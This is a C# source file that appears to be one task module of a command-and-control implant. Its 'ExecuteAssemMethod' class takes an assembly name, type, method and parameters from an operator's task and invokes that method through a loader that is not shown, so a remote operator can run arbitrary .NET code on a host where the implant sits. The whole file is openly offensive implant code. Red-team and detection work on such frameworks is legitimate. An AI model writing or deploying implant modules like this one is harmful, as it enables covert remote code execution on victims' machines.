using Implant.Models;
using Implant.Utils;

namespace Implant.Tasks.Execute
{
    class ExecuteAssemMethod : ImplantCommands
    {
        private string assemName { get; set; }
        private string assemType { get; set; }
        private string assemMethod { get; set; }
        private string assemParams { get; set; }    
        private string Args { get; set; }   

        public override string Name => "ExecuteAssemMethod";

        public override string Execute(ImplantTask task)
        {
            var opts = ImplantOptionUtils.ReturnMethod(task);
            Args = task.Args.Replace("\\", "");
            var args = ImplantOptionUtils.ParseArgs(Args);

            foreach (var opt in opts)
            {
                foreach (var _params in args.Params)
                {
                    if ((_params.OptionName.ToLower() is "assemname")
                        && (_params.OptionName.ToLower() == opt.GetPropertyValue("Name").ToString().ToLower())) {
                        assemName = _params.OptionValue;
                    }
                    if ((_params.OptionName.ToLower() is "assemtype")
                        && (_params.OptionName.ToLower() == opt.GetPropertyValue("Name").ToString().ToLower())) {
                        assemType = _params.OptionValue;
                    }
                    if ((_params.OptionName.ToLower() is "assemmethod")
                        && (_params.OptionName.ToLower() == opt.GetPropertyValue("Name").ToString().ToLower()))
                    {
                        assemMethod = _params.OptionValue;
                    }
                    if ((_params.OptionName.ToLower() is "assemparams")
                        && (_params.OptionName.ToLower() == opt.GetPropertyValue("Name").ToString().ToLower()))
                    {
                        assemParams = _params.OptionValue;
                    }
                }
            }

            if (assemParams == "") { return LoadFunctions.ExecuteAssemMethod(assemName, assemType, assemMethod); }
            else { return LoadFunctions.ExecuteAssemMethod(assemName, assemType, assemMethod, assemParams); }
        }
    }
}
